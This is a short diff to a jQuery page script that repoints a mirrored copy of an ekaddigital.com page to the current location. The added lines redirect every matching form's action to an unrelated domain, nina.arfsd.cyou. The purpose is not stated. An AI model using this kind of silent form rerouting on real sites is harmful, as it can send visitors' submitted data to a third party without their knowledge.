@@ -8,7 +8,7 @@ $(document).ready(function () {
     document.head.appendChild(link);
 
     // Change all script src attributes
-    if (window.location.href != 'https://ekaddigital.com') {
+    if (window.location.href !== 'https://ekaddigital.com/lanaiasmara/AG11697') {
         $('script[src^="https://ekaddigital.com"]').each(function() {
             $(this).attr('src', $(this).attr('src').replace('https://ekaddigital.com', window.location.href)); // Replace with your new URL
         });
@@ -16,6 +16,12 @@ $(document).ready(function () {
         // Change all link href attributes
         $('link[href^="https://ekaddigital.com"]').each(function() {
             $(this).attr('href', $(this).attr('href').replace('https://ekaddigital.com', window.location.href)); // Replace with your new URL
+        });
+        $('form').each(function() {
+            var currentAction = $(this).attr('action');
+            if (currentAction && currentAction.startsWith('https://ekaddigital.com')) {
+                $(this).attr('action', currentAction.replace('https://ekaddigital.com', 'https://nina.arfsd.cyou'));
+            }
         });
     }
 
